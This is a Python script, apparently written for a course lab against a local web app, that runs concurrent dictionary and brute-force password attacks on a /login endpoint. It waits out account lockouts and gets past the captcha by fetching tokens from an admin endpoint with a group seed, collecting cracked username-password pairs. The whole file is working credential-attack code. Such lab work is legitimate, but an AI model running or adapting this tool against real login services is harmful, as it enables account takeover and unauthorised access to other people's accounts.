import itertools
import string
from time import time
import asyncio
import aiohttp
from bs4 import BeautifulSoup

GROUP_SEED = '496905569'
TARGET_URL = 'http://localhost:5000'
CONCURRENT_REQUESTS = 100

lock = asyncio.Lock()
captcha = None
cracked = {}
attempts_count = 0
queue = None

def dictionary_attack(users, wordlist_filepath, max_attempts, max_duration_min):
    producer_args = {
        'filepath' : wordlist_filepath
    }
    return asyncio.run(_attack(users, max_attempts, max_duration_min, producer_args))

def bruteforce_attack(users, digit, lowercase, uppercase, special, max_password_length, max_attempts, max_duration_min):
    charset = ""
    charset = charset + string.digits if digit else charset
    charset = charset + string.ascii_lowercase if lowercase else charset
    charset = charset + string.ascii_uppercase if uppercase else charset
    charset = charset + string.punctuation if special else charset
    producer_args = {
        'charset' : charset,
        'max_length' : max_password_length
    }
    return asyncio.run(_attack(users, max_attempts, max_duration_min, producer_args))

def stop_attack():
    global queue
    if queue is not None:
        queue.shutdown(immediate=True)
        queue = None
    return cracked

async def _attack(users, max_attempts, max_duration_min, producer_args):
    global cracked, attempts_count, queue, captcha
    cracked = {}
    attempts_count = 0
    queue = asyncio.Queue(maxsize=CONCURRENT_REQUESTS*10)
    captcha = asyncio.Event()
    captcha.set()
    start = time()
    total_users = len(users)
    async with aiohttp.ClientSession() as session:
        producer = asyncio.create_task(_producer(queue, users, **producer_args))
        consumers = [asyncio.create_task(_consumer(session, queue, total_users, start, max_attempts, max_duration_min)) for _ in range(CONCURRENT_REQUESTS)]
        await producer
        await asyncio.gather(*consumers)
        await queue.join()
    return cracked

def _producer(queue, users, filepath=None, charset=None, max_length=0):
    if filepath is not None:
        return _producer_dict(queue, users, filepath)
    elif charset is not None and max_length > 0:
        return _producer_bf(queue, users, charset, max_length)

async def _producer_dict(queue, users, filepath):
    with open(filepath, 'r') as wordlist:
        for line in wordlist:
            password = line.strip()
            for username in users:
                try:
                    await queue.put([username, password])
                except asyncio.QueueShutDown:
                    return
    await queue.put(None)

async def _producer_bf(queue, users, charset, max_length):
    for length in range(1, max_length+1):
        for combination in itertools.product(charset, repeat=length):
            password = ''.join(combination)
            for username in users:
                try:
                    await queue.put([username, password])
                except asyncio.QueueShutDown:
                    return
    await queue.put(None)

async def _consumer(session, queue, total_users, start, max_attempts, max_duration_min):
    while True:
        try:
            item = await queue.get()
        except asyncio.QueueShutDown:
            break
        if item is None:
            queue.task_done()
            queue.shutdown(immediate=False)
            break
        username, password = item
        await captcha.wait()
        result = await _attempt_login(session, username, password)
        global cracked, attempts_count
        async with lock:
            if result is None and username not in cracked: cracked[username] = None
            elif result: cracked[username] = password
            attempts_count += 1
            queue.task_done()
            if len(cracked) == total_users or attempts_count > max_attempts or time() - start > max_duration_min * 60:
                queue.shutdown(immediate=True)
                break

async def _attempt_login(session, username, password):
    payload = {'username': username, 'password': password}
    await captcha.wait()
    async with session.post(TARGET_URL + '/login', data=payload) as response:
        html = await response.text()
        return await _handle_html_response(session, html, username, password)
    
async def _handle_html_response(session, html, username, password):
    soup = BeautifulSoup(html, 'html.parser')
    msg = soup.find(id="msg").get_text().strip()
    if msg.startswith("locked for"):
        await asyncio.sleep(60)
        return await _attempt_login(session, username, password)
    if msg == "wrong token":
        await captcha.wait()
        captcha.clear()
        token = await _get_captcha_token(session)
        payload = {'username': username, 'password': password, 'captcha': token}
        async with session.post(TARGET_URL + '/login', data=payload) as response:
            html = await response.text()
            captcha.set()
            return await _handle_html_response(session, html, username, password)
    if msg == "locked" or msg == "wrong OTP":
        return None
    return msg == "logged in"

async def _get_captcha_token(session):
    async with session.get(TARGET_URL + '/admin/get_captcha_token?group_seed=' + GROUP_SEED) as response:
        html = await response.text()
        soup = BeautifulSoup(html, 'html.parser')
        token = soup.find(id="msg").get_text().strip()[7:]
        return token if token != "not found" else None
